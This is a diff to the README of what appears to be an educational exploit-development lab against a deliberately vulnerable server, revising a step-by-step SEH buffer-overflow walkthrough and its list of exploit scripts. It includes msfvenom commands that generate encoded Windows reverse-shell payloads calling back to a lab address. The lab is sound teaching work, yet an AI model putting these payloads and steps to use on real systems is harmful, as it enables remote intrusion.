@@ -742,7 +742,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 		* `b'A' * (3506 - 79)` We place the first series of `A`s so that out stack realignment is placed where the 127-byte short jump lands
 		* We inject the necessary instructions for the stack realignment
 		* `b'A' * (79 - 6)`: We place additional A's so the short conditional jumps are placed where the SEH handler jumps to.
-	5. We can modify the exploit program to reflect [exploit9.py](./SourceCode/exploit9.py) and test the program as we have done previously.
+	5. We can modify the exploit program to reflect [exploit10.py](./SourceCode/exploit10.py) and test the program as we have done previously.
 
 		https://github.com/DaintyJet/VChat_LTER/assets/60448620/d14cb21b-3068-4f66-ab22-53cd62c0e7c0
 
@@ -882,7 +882,7 @@ With this exploit we will use the well known [msfvenom](https://docs.metasploit.
 2. Now we need to generate the encoded shellcode we will inject into the buffer, as stated before we will be using the [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) program. 
 
 
-	https://github.com/DaintyJet/VChat_LTER/assets/60448620/893c3b13-d436-4827-afb3-4802ea867a3e
+	https://github.com/DaintyJet/VChat_LTER/assets/60448620/893c3b13-d436-4827-afb3-4802ea867a3e <!-- Replace -->
 
 
 	1. We can first try generating a payload as we have done before (without an Encoder)
@@ -904,7 +904,7 @@ With this exploit we will use the well known [msfvenom](https://docs.metasploit.
 		* Notice that none of the encoders that *msfvenom* tried automatically worked, we can try again but we can specify which encoder should be used for better results!
 
 	2. Now we can specify an encoder such as [x86/alpha_mixed](https://www.infosecmatter.com/metasploit-module-library/?mm=encoder/x86/alpha_mixed), and we can use the available options to specify the register pointing to the buffer we will use as the `esp` register!
-
+		<!-- look into REMOVE -a and --platform, others that work seem to not include this?-->
 		```
 		msfvenom -p windows/shell_reverse_tcp LPORT=8080 LHOST=10.0.2.15 -a x86 --platform windows -f python -e x86/alpha_mixed bufferregister=esp -b '\x00x\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
 		```
@@ -1050,7 +1050,7 @@ We will preform a similar exploit to one done for the [KSTET_Multi](https://gith
 
 3. Now we need to assemble the assembly into machine code and then extract the machine instructions so we can encode them.
 
-	https://github.com/DaintyJet/VChat_LTER/assets/60448620/5535983c-3398-4f38-b8e4-b440e4104aab
+	https://github.com/DaintyJet/VChat_LTER/assets/60448620/5535983c-3398-4f38-b8e4-b440e4104aab <!-- Replace -->
 
 	1. Ensure nasm is installed, if not you will need to [install it](https://nasm.us/) and add it to the path.
 
@@ -1107,8 +1107,9 @@ We will preform a similar exploit to one done for the [KSTET_Multi](https://gith
 			<img src="Images/I53.png" width=800>
 
 4.  Generate the second stage reverse shell code using ```msfvenom``` program, and create a exploit as shown in [exploit12c-MULT.py](./SourceCode/exploit12c-MULT.py) 
+	<!-- Look into ADD -a x86 and --platform windows -->
 	```
-	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00x\0a\x0d'
+	$ msfvenom  -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00x\0a\x0d'
 	```
 	* `-p `: Payload we are generating shellcode for.
     	* `windows/shell_reverse_tcp`: Reverse TCP payload for windows
@@ -1225,14 +1226,30 @@ The following graphs present how ESP changes in my case (from 0x0101EC2C to 0x01
 - Victim host: 10.0.2.7
 
 ## Test code
-1. [exploit1.py](SourceCode/exploit1.py) : Sending a cyclic pattern of chars to identify the offset that we need to inject to control EIP.
-2. [exploit2.py](SourceCode/exploit2.py) : Replacing the bytes at the offset discovered by exploit1.py with the address of *POP EBX, POP EBP, RETN*.
-3. [exploit3.py](SourceCode/exploit3.py) : Replacing the bytes at the offset discovered by exploit1.py with the address of return instructions which don't contain bad characters.
-3. [exploit4.py](SourceCode/exploit4.py) : Adding conditional jump which does not contains bad characters.
-5. [exploit5.py](SourceCode/exploit5.py) : Adding ESP alignment
-6. [exploit6.py](SourceCode/exploit6.py) : Adding short jump and ESP alignment for the long jump
-6. [exploit7.py](SourceCode/exploit7.py) : Adding long jump
-6. [exploit8.py](SourceCode/exploit8.py) : Adding stage1 and stage2 shell code
+
+1. [exploit0.py](SourceCode/exploit0.py): Send 5000 `A`s to crash the server   
+2. [exploit1.py](SourceCode/exploit1.py): Sending a cyclic pattern of chars to identify the offset that we need to inject to control EIP.
+3. [exploit2.py](SourceCode/exploit2.py): Send 4 B's at the location of the offset identified to confirm.
+4. [exploit3.py](SourceCode/exploit3.py): Replacing the bytes at the offset discovered by exploit1.py with the address of *POP EBX, POP EBP, RETN*. **Contains Bad Characters**! 
+5. [exploit4x.py](SourceCode/exploit4a.py): Send data-array of all possible ASCII character values various generation methods are provided 
+	* [exploit4a.py](SourceCode/exploit4a.py): Array Generated by mona.py
+	* [exploit4b.py](SourceCode/exploit4b.py): Array Generated with multi-line for loop
+	* [exploit4c.py](SourceCode/exploit4c.py): Array Generated by a one-liner
+6. [exploit5.py](SourceCode/exploit5.py): Replacing the bytes at the offset discovered by exploit1.py with the address of *POP EBX, POP EBP, RETN*. **Does Not Contain Bad Characters**! 
+7. [exploit6.py](SourceCode/exploit6.py): Add conditional jump to avoid bad characters.
+8. [exploit7a.py](SourceCode/exploit7a.py): MSF-Encoding example (Does not work, due to containing bad characters).
+9. [exploit7a.py](SourceCode/exploit7a.py): Aligns ESP.
+10. [exploit8.py](SourceCode/exploit8.py): Zeros out the EAX register, avoids bad characters by using two and operations. 
+11. [exploit9.py](SourceCode/exploit9.py): Adds short Jump.
+12. [exploit10.py](SourceCode/exploit10.py): Realigns stack.
+13. [exploit11.py](SourceCode/exploit11.py): Adds encoded long jump.
+14. [exploit12-MSF.py](SourceCode/exploit12b-MSF.py): Injects encoded reverse shell at the start of the buffer.
+	* [exploit12a-MSF.py](SourceCode/exploit12a-MSF.py): Adjust ESP.
+	* [exploit12b-MSF.py](SourceCode/exploit12b-MSF.py): Inject MSF encoded Shellcode.
+15. [exploit12-MULT.py](SourceCode/exploit12b-MULT.py): Code reuse and multi-stage exploit.
+	* [exploit12a-MULT.py](SourceCode/exploit12a-MULT.py): Adjust ESP.
+	* [exploit12b-MULT.py](SourceCode/exploit12b-MULT.py): Inject the encoded first stage.
+	* [exploit12c-MULT.py](SourceCode/exploit12b-MULT.py): Send the second stage. 
 
 ## References
 
